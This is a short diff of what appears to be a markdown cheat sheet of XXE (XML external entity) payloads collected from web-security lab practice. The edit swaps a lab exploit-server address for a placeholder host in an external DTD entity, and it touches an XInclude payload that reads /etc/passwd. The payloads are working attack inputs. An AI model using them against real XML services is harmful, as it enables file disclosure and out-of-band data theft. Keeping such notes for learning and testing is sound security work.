@@ -701,7 +701,7 @@ codes/xxe/error.dtd
 
 \<!DOCTYPE foo [
 
-\<!ENTITY % xxe SYSTEM "https://exploit-0a68008104673c17c01f5f1c01020020.web-security-academy.net/evil.dtd"> 
+\<!ENTITY % xxe SYSTEM "https://ip/evil.dtd"> 
 
 %xxe;
 
@@ -719,7 +719,7 @@ codes/xxe/error.dtd
   
 ### XXE OOB - XInclude to retrieve files with dtd file
 
-\<foo xmlns:xi="http://www.w3.org/2001/XInclude">\<xi:include parse="text" href="file:///etc/passwd"/>\</foo>
+\<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>\</foo>
 
 ### XXE OOB - Image file upload
 
